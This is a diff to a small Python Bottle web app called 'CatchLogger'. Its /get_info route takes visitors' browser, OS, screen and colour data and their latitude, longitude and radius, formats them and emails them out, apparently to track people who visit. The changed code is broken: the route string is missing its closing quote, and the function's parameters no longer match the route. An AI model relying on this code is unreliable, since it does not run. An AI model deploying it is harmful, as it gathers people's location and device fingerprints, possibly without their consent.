@@ -40,8 +40,12 @@ def man():
 def rtrn():
     return static_file('browser.js', root='./js/')
 
-@get("/get_info/<brser>/<lng>/<ops>/<bbrser>/<bos>/<height>/<width>/<colors>/<lat>/<long>/<rad>")
-def obr(brser, lng, ops, bbrser, bos, height, width, colors, lat, long, rad):
+@get("/get_info)
+def obr(browser, language, OS, h, w, c, lat, long, rad):
+    d = {}
+    info = list("browser, language, OS, h, w, c, lat, long, rad".split(", "))
+    for i in info:
+         d[i] = request.query[i]
     text = """By navigator:
 Browser: %s
 Language: %s
@@ -62,7 +66,7 @@ longitude: %s
 Radius: %s
 
 ----
-CatchLogger system by Andrey A Tyunyatkin""" % (brser, lng, ops, bbrser, bos, height, width, colors, lat, long, rad)
+CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['h'], d['w'], d['c'], d['lat'], d['long'], d['rad'])
     send_email(text)
     
 
